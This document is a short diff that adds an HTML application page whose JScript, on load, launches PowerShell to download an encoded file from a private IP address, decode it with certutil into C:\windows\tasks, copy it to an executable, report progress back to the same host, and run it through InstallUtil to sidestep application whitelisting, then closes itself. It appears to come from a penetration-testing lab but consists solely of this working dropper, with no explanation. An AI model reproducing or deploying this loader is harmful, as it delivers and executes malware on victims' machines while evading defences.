@@ -1,0 +1,12 @@
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -usebasicparsing -uri http://192.168.45.186/enc100.txt -outfile c:\\users\\public\\enc100.txt; $dir = test-path -path c:\\users\\public\\enc100.txt; iwr -usebasicparsing -uri http://192.168.45.186/$dir; sleep 2; certutil.exe -decode c:\\users\\public\\enc100.txt c:\\windows\\tasks\\stamenc; sleep 2; copy c:\\windows\\tasks\\stamenc c:\\windows\\tasks\\stamenc.exe; $dir2 = test-path -path c:\\windows\\tasks\\stamenc.exe; sleep 2; iwr -usebasicparsing -uri http://192.168.45.186/$dir2; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U c:\\windows\\tasks\\stamenc.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
